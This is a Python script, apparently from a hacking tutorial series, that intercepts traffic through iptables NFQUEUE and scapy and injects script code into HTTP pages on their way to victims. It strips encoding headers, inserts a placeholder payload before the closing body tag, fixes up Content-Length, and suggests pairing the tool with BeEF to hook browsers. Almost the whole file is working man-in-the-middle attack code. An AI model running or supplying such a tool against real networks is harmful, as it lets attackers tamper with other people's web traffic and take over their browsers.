#reffer "file_interceptor.py" for more details

import subprocess
#pip install netfilterqueue
import netfilterqueue
import scapy.all as scapy
import re

def linux_commands_start():
	subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num0", shell=True)
	subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num0", shell=True)
	#to test on your another computer change the above command two command with a single "iptables -I FORWARD -j NFQUEUE --queue-num0" command
	subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def linux_commands_end():
	subprocess.call("iptables --flush", shell=True)

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].len
	del packet[scapy.TCP].chksum
	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		if scapy_packet[scapy.TCP].dport == 80:
			print("Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			#load = load.replace("HTTP/1.1", "HTTP/1.0") for HTTPS websites

		elif scapy_packet[scapy.TCP].sport == 80:
			print("Response")
			print(scapy_packet.show())
			injection_code="OUR SCRIPT CODE"
			load= load.replace("</body>",injection_code + "</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d)*", load)
			if content_length_search and "text/html" in load:
				content_length= content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load =load.replace(content_length, str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:
			new_packet=set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))

	packet.accept() #reffer net_cut.py for more details

linux_commands_start()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

linux_commands_end() 

#use BEeF to hook browsers with this code injector and play around!